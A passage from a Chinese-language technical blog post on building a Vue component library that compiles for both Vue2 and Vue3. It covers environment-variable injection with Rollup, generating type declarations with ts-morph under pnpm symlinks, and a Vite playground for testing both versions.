function_">_c</span>(<span class="string">&quot;div&quot;</span>, &#123; <span class="attr">class</span>: _setup.<span class="title function_">classNs</span>(<span class="string">&quot;uni-comp&quot;</span>, <span class="string">`uni-comp--<span class="subst">$&#123;_vm.type&#125;</span>`</span>), <span class="attr">attrs</span>: &#123; <span class="string">&quot;title&quot;</span>: <span class="string">`vue version: <span class="subst">$&#123;_setup.vueVersion&#125;</span>`</span> &#125; &#125;, [<span class="title function_">_c</span>(<span class="string">&quot;span&quot;</span>, &#123; <span class="attr">staticClass</span>: <span class="string">&quot;count&quot;</span> &#125;, [_vm.<span class="title function_">_v</span>(_vm.<span class="title function_">_s</span>(_setup.<span class="property">count</span>))]), <span class="title function_">_c</span>(<span class="string">&quot;button&quot;</span>, &#123; <span class="attr">staticClass</span>: <span class="string">&quot;add-button&quot;</span>, <span class="attr">on</span>: &#123; <span class="string">&quot;click&quot;</span>: _setup.<span class="property">addCount</span> &#125; &#125;, [_vm.<span class="title function_">_v</span>(<span class="string">&quot;Add&quot;</span>)])]);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> _sfc_staticRenderFns = [];</span><br><span class="line">_sfc_render.<span class="property">_withStripped</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">var</span> __component__ = <span class="comment">/* @__PURE__ */</span> <span class="title function_">normalizeComponent</span>(</span><br><span class="line">  _sfc_main,</span><br><span class="line">  _sfc_render,</span><br><span class="line">  _sfc_staticRenderFns);</span><br><span class="line">__component__.<span class="property">options</span>.<span class="property">__file</span> = <span class="string">&quot;/Users/carb/Documents/Code/github/uni-vue-components/packages/src/components/uni-comp/src/uni-comp.vue&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Component</span> = __component__.<span class="property">exports</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> &#123; <span class="title class_">Component</span> <span class="keyword">as</span> <span class="keyword">default</span> &#125;;</span><br><span class="line"><span class="comment">//# sourceMappingURL=uni-comp.vue.mjs.map</span></span><br></pre></td></tr></table></figure><p>编译后的 Vue3 组件：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> _sfc_main <span class="keyword">from</span> <span class="string">&#x27;./uni-comp.vue2.mjs&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; openBlock, createElementBlock, normalizeClass, createElementVNode, toDisplayString &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> _export_sfc <span class="keyword">from</span> <span class="string">&#x27;../../../_virtual/_plugin-vue_export-helper.mjs&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> _hoisted_1 = [<span class="string">&quot;title&quot;</span>];</span><br><span class="line"><span class="keyword">const</span> _hoisted_2 = &#123; <span class="attr">class</span>: <span class="string">&quot;count&quot;</span> &#125;;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">_sfc_render</span>(<span class="params">_ctx, _cache, $props, $setup, $data, $options</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">openBlock</span>(), <span class="title function_">createElementBlock</span>(<span class="string">&quot;div&quot;</span>, &#123;</span><br><span class="line">    <span class="attr">class</span>: <span class="title function_">normalizeClass</span>($setup.<span class="title function_">classNs</span>(<span class="string">&quot;uni-comp&quot;</span>, <span class="string">`uni-comp--<span class="subst">$&#123;$props.type&#125;</span>`</span>)),</span><br><span class="line">    <span class="attr">title</span>: <span class="string">`vue version: <span class="subst">$&#123;$setup.vueVersion&#125;</span>`</span></span><br><span class="line">  &#125;, [</span><br><span class="line">    <span class="title function_">createElementVNode</span>(</span><br><span class="line">      <span class="string">&quot;span&quot;</span>,</span><br><span class="line">      _hoisted_2,</span><br><span class="line">      <span class="title function_">toDisplayString</span>($setup.<span class="property">count</span>),</span><br><span class="line">      <span class="number">1</span></span><br><span class="line">      <span class="comment">/* TEXT */</span></span><br><span class="line">    ),</span><br><span class="line">    <span class="title function_">createElementVNode</span>(<span class="string">&quot;button&quot;</span>, &#123;</span><br><span class="line">      <span class="attr">class</span>: <span class="string">&quot;add-button&quot;</span>,</span><br><span class="line">      <span class="attr">onClick</span>: $setup.<span class="property">addCount</span></span><br><span class="line">    &#125;, <span class="string">&quot;Add&quot;</span>)</span><br><span class="line">  ], <span class="number">10</span>, _hoisted_1);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Component</span> = <span class="comment">/* @__PURE__ */</span> <span class="title function_">_export_sfc</span>(_sfc_main, [[<span class="string">&quot;render&quot;</span>, _sfc_render], [<span class="string">&quot;__file&quot;</span>, <span class="string">&quot;/Users/carb/Documents/Code/github/uni-vue-components/packages/src/components/uni-comp/src/uni-comp.vue&quot;</span>]]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> &#123; <span class="title class_">Component</span> <span class="keyword">as</span> <span class="keyword">default</span> &#125;;</span><br><span class="line"><span class="comment">//# sourceMappingURL=uni-comp.vue.mjs.map</span></span><br></pre></td></tr></table></figure><p>可以看出，Vue3 在 Vue2 基础上增加了很多渲染函数，逻辑处理上也有很大的差异，因此编译后的组件是没办法同时在 Vue3 和 Vue2 上运行的，只能单独发包。</p><blockquote><p><a href="https://github.com/EsunR/universal-vue-components/blob/main/packages/builder/builders/modules.ts">构建器实现参考</a></p></blockquote><h3 id="组件如何判断当前环境是-Vue2-还是-Vue3"><a href="#组件如何判断当前环境是-Vue2-还是-Vue3" class="headerlink" title="组件如何判断当前环境是 Vue2 还是 Vue3"></a>组件如何判断当前环境是 Vue2 还是 Vue3</h3><p>在 Node 环境中，只要我们指定了环境变量，就可以通过 <code>process.env.VUE_VERSION</code> 来判断当前执行的 Vue2 还是 Vue3 的构建。但是在组件中，其最终的运行环境是浏览器，并且没有 VUE_VERSION 这个环境变量来判断。因此在构建时，我们就需要将 VUE_VERSION 这个环境变量值注入到组件库中。</p><p>在此我们可以使用 <a href="https://www.npmjs.com/package/@rollup/plugin-replace">@rollup/plugin-replace</a> 插件，其可以将 <code>process.env.IS_VUE2</code> 硬编码为具体的环境变量值：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="attr">rollupOption</span>: <span class="title class_">RollupOptions</span> = &#123;</span><br><span class="line"><span class="comment">// ... ...</span></span><br><span class="line"><span class="attr">plugins</span>: [</span><br><span class="line"><span class="title function_">replace</span>(&#123;</span><br><span class="line">            <span class="string">&#x27;process.env.VUE_VERSION&#x27;</span>: process.<span class="property">env</span>.<span class="property">VUE_VERSION</span>,</span><br><span class="line">        &#125;),</span><br><span class="line">        <span class="comment">// ... ..</span></span><br><span class="line">]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>组件编译前：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">is vue2: &#123;&#123;IS_VUE2&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">setup</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> <span class="variable constant_">IS_VUE2</span> = process.<span class="property">env</span>.<span class="property">VUE_VERSION</span> === <span class="string">&#x27;2&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>组件编译后（假设构建目标是 Vue2）：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">is vue2: &#123;&#123;IS_VUE2&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">setup</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> <span class="variable constant_">IS_VUE2</span> = <span class="string">&#x27;2&#x27;</span> === <span class="string">&#x27;2&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里再特别提一句，有的同学可能考虑使用 <a href="https://www.npmjs.com/package/rollup-plugin-inject-process-env">rollup-plugin-inject-process-env</a> 这个插件来注入 <code>process.env</code>。该插件并不会将 <code>process.env</code> 进行硬编码，而是将其转成一个 helper 函数：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> env = &#123;<span class="string">&quot;VUE_VERSION&quot;</span>:<span class="string">&quot;3&quot;</span>&#125;;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (process) &#123;</span><br><span class="line">            process.<span class="property">env</span> = <span class="title class_">Object</span>.<span class="title function_">assign</span>(&#123;&#125;, process.<span class="property">env</span>);</span><br><span class="line">            <span class="title class_">Object</span>.<span class="title function_">assign</span>(process.<span class="property">env</span>, env);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;&#125; <span class="comment">// avoid ReferenceError: process is not defined</span></span><br><span class="line">    globalThis.<span class="property">process</span> = &#123; <span class="attr">env</span>:env &#125;;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>这样组件代码在运行时就可以获取到 env 变量。但是这种方法与 webpack 的 EnvironmentPlugin 插件会有冲突，EnvironmentPlugin 也会尝试处理上面这个 helper 函数的 process.env，最终导致上面的 helper 函数被改写错误，因此不推荐使用该插件。</p><h3 id="为组件编译出-dts-声明文件"><a href="#为组件编译出-dts-声明文件" class="headerlink" title="为组件编译出 dts 声明文件"></a>为组件编译出 dts 声明文件</h3><p>既然我们组件可以用 Typescript 编写 Vue 组件，那么对应的我们就应该为这些 TS 组件生成 dts 声明文件方便其他用户的使用，这样组件在调用时就回出现 props 提示以及类型校验，效果如下：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240927171714.png" alt="image.png|400"></p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240927171800.png" alt="image.png|400"></p><p>但是，Vue 官方并没有提供由 SFC 组件生成对应类型声明文件的工具，好在我们有 <a href="https://ts-morph.com/">ts-morph</a> 这把瑞士军刀，具体的实现方案为：</p><ol><li>使用 complier-sfc 解析出 SFC 组件的 script 部分；</li><li>使用 ts-morph 来分析 script 部分的 ts 代码，并解析出类型声明；</li><li>将类型声明内容写入到 dist 目录中对应的组件 js 旁，生成 dts 文件；</li></ol><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240927171225.png" alt=""></p><p><a href="https://github.com/EsunR/universal-vue-components/blob/main/packages/builder/builders/types-definitions.ts">编译 dts 声明文件的完整实现参考</a></p><p>但是需要注意的是，由于我们使用了 pnpm，其 shamefully-hoist 特性并不会将间接依赖的包放在 node_modules 根目录下，并且包是通过软链的方式进行访问的，因此 ts-morph 自己的模块索引方法并不能很好的处理这些问题，可能会导致某些包无法查找到，举例来说：</p><p>项目中依赖某个包 <a href="mailto:module@1.0.0">module@1.0.0</a>，这个包又依赖 <a href="mailto:peer@1.0.0">peer@1.0.0</a>。对于 npm 项目来说，npm 会直接将 module 和 peer 都安装到 node_modules 目录下（没有依赖冲突的情况下），这样 ts-morph 在解析 module 对 peer 的引入时，能查找到 peer 模块。</p><p>然而对于 pnpm 来说，依赖包是严格被隔离的，<strong>没有指定安装的包是不会出现在项目 node_modules 根目录下的</strong> 。module 的真实安装路径为 <code>node_modules/.pmpm/module@1.0.0/node_modules/module</code>，peer 的真实安装路径位于 module 的同级目录下，也就是 <code>node_modules/.pmpm/module@1.0.0/node_modules/peer</code>。但是由于 module 是当前项目指定安装的依赖，会通过软链连接到 <code>node_modules/module</code> 目录下，然而 peer 并属于子依赖，并非当前项目的直接依赖，根据 shamefully-hoist 原则，peer 不会显示在 node_modules 的根目录下。</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240929110546.png" alt=""></p><p>NodeJS 对于软链会做真实路径的解析，因此 pnpm 这种嵌套隔离 + 软链接的方式是可以正常进行模块查找的。但是 ts-morph 并不会解析软链，它不会从 module 安装的真实路径（<code>node_modules/.pmpm/module@1.0.0/node_modules/module</code>）来开始查找 peer，而是依然从软链的路径（<code>node_modules/module</code>）开始进行 peer 包查找，那自然无法正常找到了。因此，我们必须告诉 ts-morph，如果是软链的话，将软链解析为真实路径在进行模块查找，才能正确找到目标包。</p><p>我们可以编写一个 ts-morph 的自定义模块解析器来实现这一行为：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ts-morph 自定义模块解析器</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">customModuleResolution</span>(<span class="params"></span></span><br><span class="line"><span class="params">    moduleResolutionHost: ts.ModuleResolutionHost,</span></span><br><span class="line"><span class="params">    getCompilerOptions: () =&gt; ts.CompilerOptions</span></span><br><span class="line"><span class="params"></span>): <span class="title class_">ResolutionHost</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="title function_">resolveModuleNames</span>(<span class="params"></span></span><br><span class="line"><span class="params">        <span class="comment">// 当前文件引入的模块列表</span></span></span><br><span class="line"><span class="params">        moduleNames,</span></span><br><span class="line"><span class="params">        <span class="comment">// 当前索引到的文件</span></span></span><br><span class="line"><span class="params">containingFile</span></span><br><span class="line"><span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">let</span> containingFileRealPath = containingFile;</span><br><span class="line">            <span class="comment">// 由于项目使用了 pnpm，npm 包实际是以软链的方式链接在 node_modules 下的，因此在 resolve 前需要转为真实路径</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                containingFileRealPath = fs.<span class="title function_">realpathSync</span>(</span><br><span class="line">                    containingFile,</span><br><span class="line">                    <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">                );</span><br><span class="line">            &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">                <span class="comment">// 找不到没关系，因为找不到的文件是在 Project 中存储的虚拟文件</span></span><br><span class="line">            &#125;</span><br><span class="line">            moduleNames = moduleNames</span><br><span class="line">                .<span class="title function_">map</span>(removeTsExtension)</span><br><span class="line">                .<span class="title function_">map</span>(mapModuleAlias);</span><br><span class="line">            <span class="keyword">const</span> compilerOptions = <span class="title function_">getCompilerOptions</span>();</span><br><span class="line">            <span class="keyword">const</span> <span class="attr">resolvedModules</span>: ts.<span class="property">ResolvedModule</span>[] = [];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">const</span> moduleName <span class="keyword">of</span> moduleNames.<span class="title function_">map</span>(removeTsExtension)) &#123;</span><br><span class="line">            <span class="comment">// 调用模块解析方法，传入真实的文件路径来查找包</span></span><br><span class="line">                <span class="keyword">const</span> result = ts.<span class="title function_">resolveModuleName</span>(</span><br><span class="line">                    moduleName,</span><br><span class="line">                    containingFileRealPath,</span><br><span class="line">                    compilerOptions,</span><br><span class="line">                    moduleResolutionHost</span><br><span class="line">                );</span><br><span class="line">                <span class="keyword">if</span> (result.<span class="property">resolvedModule</span>) &#123;</span><br><span class="line">                    resolvedModules.<span class="title function_">push</span>(result.<span class="property">resolvedModule</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// 无法解析的模块不影响 dts 的生成，所以只是警告（如果是非 assets 模块则不需要理会，其他模块最好排查一下错误原因）</span></span><br><span class="line">                    <span class="keyword">if</span> (!<span class="regexp">/\.(css|styl|style)/</span>.<span class="title function_">test</span>(moduleName)) &#123;</span><br><span class="line">                        consola.<span class="title function_">warn</span>(</span><br><span class="line">                            <span class="string">`[types definition] Cannot resolve module: <span class="subst">$&#123;moduleName&#125;</span>`</span></span><br><span class="line">                        );</span><br><span class="line">                    &#125;</span><br><span class="line">                    resolvedModules.<span class="title function_">push</span>(<span class="literal">undefined</span> <span class="keyword">as</span> <span class="built_in">any</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> resolvedModules;</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 移除 ts 文件后缀</span></span><br><span class="line"><span class="comment"> * import module form &#x27;module.ts&#x27; -&gt; import module form &#x27;module&#x27;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">removeTsExtension</span>(<span class="params">moduleName: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (moduleName.<span class="title function_">slice</span>(-<span class="number">3</span>).<span class="title function_">toLowerCase</span>() === <span class="string">&#x27;.ts&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> moduleName.<span class="title function_">slice</span>(<span class="number">0</span>, -<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> moduleName;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将模块名映射为对应的包名</span></span><br><span class="line"><span class="comment"> * !!! 注意：这里修改 moduleName 是为了让 ts-morph 正确解析依赖，并不会修改最终输出代码的模块名称</span></span><br><span class="line"><span class="comment"> * !!! 输出代码的模块名称仍然会按照原有名称输出，如果需要修改输出的模块名，在下面的 outputContentReplacer 中修改</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">mapModuleAlias</span>(<span class="params">moduleName: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">    <span class="comment">// 根据构建目标修正 Vue 索引的版本</span></span><br><span class="line">    <span class="comment">// e.g. 构建 Vue3 组件库时 import &#123;createApp&#125; form &#x27;vue&#x27; -&gt; import &#123;createApp&#125; form &#x27;vue3&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> ([<span class="string">&#x27;vue&#x27;</span>, <span class="string">&#x27;vue2&#x27;</span>, <span class="string">&#x27;vue3&#x27;</span>].<span class="title function_">includes</span>(moduleName)) &#123;</span><br><span class="line">        moduleName = <span class="variable constant_">IS_VUE2</span> ? <span class="string">&#x27;vue2&#x27;</span> : <span class="string">&#x27;vue3&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 正确索引到 @src</span></span><br><span class="line">    <span class="comment">// import module form &#x27;@src/components&#x27; -&gt; import module form &#x27;project-path/packages/src/components&#x27;</span></span><br><span class="line">    moduleName = moduleName.<span class="title function_">replace</span>(<span class="string">&#x27;@src&#x27;</span>, compsSrcPath);</span><br><span class="line">    <span class="keyword">return</span> moduleName;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此外，在组件编译类型时，可能发生报错 TS2742，具体报错信息为类似：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR  ../src/components/uni-comp/src/uni-comp.vue.ts:7:1 - error TS2742: The inferred type of &#x27;default&#x27; cannot be named without a reference to &#x27;.pnpm/vue@2.7.16/node_modules/vue/types/common&#x27;. This is likely not portable. A type annotation is necessary.</span><br></pre></td></tr></table></figure><p>这类问题的缘由都一样，以上面的报错信息为例，出现报错的原因是因为组件内使用了 <code>defineProps(&#123;...&#125;)</code> 来声明组件 Props 引发的。经由编译后的 TS 类型声明文件中会使用到 <code>LooseRequired</code> 接口，然而该接口并未在 <code>vue</code> 中作为默认使用导出，所以编译器需要按照相对路径对其进行引用，由于我们使用了 pnpm，所以该接口在当前设备下引用的地址为 <code>.pnpm/vue@2.7.16/node_modules/vue/types/common</code>。但是我们编译出的类型声明文件是需要给别人用的，在他人的设备下引用路径不一定是这个，所以 ts 编译器会检测到该路径在其他设备上不适用，对其进行报错。</p><p>解决方案：在入口文件中声明一下导出位置，这样 ts 就能知道如何去引用类型了：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// packages/vr-components/src/index.ts</span></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">type</span> &#123;&#125; <span class="keyword">from</span> <span class="string">&#x27;vue2/types/common&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">type</span> &#123;&#125; <span class="keyword">from</span> <span class="string">&#x27;@vue/shared&#x27;</span>;</span><br></pre></td></tr></table></figure><p><a href="https://github.com/microsoft/TypeScript/pull/58176#issuecomment-2052698294">参考</a></p><h2 id="3-3-在不同的-Vue-版本下调试组件"><a href="#3-3-在不同的-Vue-版本下调试组件" class="headerlink" title="3.3 在不同的 Vue 版本下调试组件"></a>3.3 在不同的 Vue 版本下调试组件</h2><p>我们可以通过搭建一个 Vite 服务来调试组件在不同版本 vue 环境下的表现，因此 Vite 也必须同时支持 Vue2 和 Vue3 的两种编译模式。为了达到这一目的，我们可以创建一个 Playground 模块，与我们编写组件编译器类似的，我们需要在 Playground 模块中同时安装 Vue2 和 Vue3：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将 vue2.7 安装到 node_modules/vue2 目录下</span></span><br><span class="line">pnpm install vue2@npm:vue@2.7</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 vue3.2 安装到 node_modules/vue2 目录下</span></span><br><span class="line">pnpm install vue3@npm:vue@3.2</span><br></pre></td></tr></table></figure><p>然后我们通过 Vite 服务启动时的环境变量来决定 Vite 使用 Vue2 的构建还是 Vue3 的构建，<code>vite.config.ts</code> 的参考如下：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;defineConfig&#125; <span class="keyword">from</span> <span class="string">&#x27;vite&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> vue2 <span class="keyword">from</span> <span class="string">&#x27;@vitejs/plugin-vue2&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> vue3 <span class="keyword">from</span> <span class="string">&#x27;@vitejs/plugin-vue&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> vue2Compiler <span class="keyword">from</span> <span class="string">&#x27;vue2/compiler-sfc&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> vue3Compiler <span class="keyword">from</span> <span class="string">&#x27;vue3/compiler-sfc&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> path <span class="keyword">from</span> <span class="string">&#x27;path&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据环境变量判断启动的 Vue 版本</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">IS_VUE2</span> = process.<span class="property">env</span>.<span class="property">VITE_VUE_VERSION</span> === <span class="string">&#x27;2&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">defineConfig</span>(&#123;</span><br><span class="line">    <span class="attr">plugins</span>: [</span><br><span class="line">    <span class="comment">// 与 Rollup 中我们的配置一样</span></span><br><span class="line">        <span class="variable constant_">IS_VUE2</span></span><br><span class="line">            ? <span class="title function_">vue2</span>(&#123;</span><br><span class="line">                  <span class="attr">compiler</span>: vue2Compiler <span class="keyword">as</span> <span class="built_in">any</span>,</span><br><span class="line">              &#125;)</span><br><span class="line">            : <span class="title function_">vue3</span>(&#123;</span><br><span class="line">                  <span class="attr">compiler</span>: vue3Compiler,</span><br><span class="line">              &#125;),</span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">resolve</span>: &#123;</span><br><span class="line">        <span class="attr">alias</span>: &#123;</span><br><span class="line">        <span class="comment">// 定向到正确的 Vue 版本</span></span><br><span class="line">            <span class="attr">vue</span>: <span class="variable constant_">IS_VUE2</span> ? <span class="string">&#x27;vue2&#x27;</span> : <span class="string">&#x27;vue3&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;@&#x27;</span>: path.<span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;./src/&#x27;</span>),</span><br><span class="line">            <span class="comment">// 映射组件源码中使用的 @src 路径别名</span></span><br><span class="line">            <span class="string">&#x27;@src&#x27;</span>: path.<span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;../src/&#x27;</span>),</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>此外，不同版本的 Vue 入口是不一样的，比如 Vue2 中我们需要使用 <code>new</code> 创建一个 Vue 实例，而在 Vue3 中我们则是使用 <code>createApp</code> 创建一个 app 实例，因此入口需要分开定义：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main_vue2.ts, vue2 入口</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span 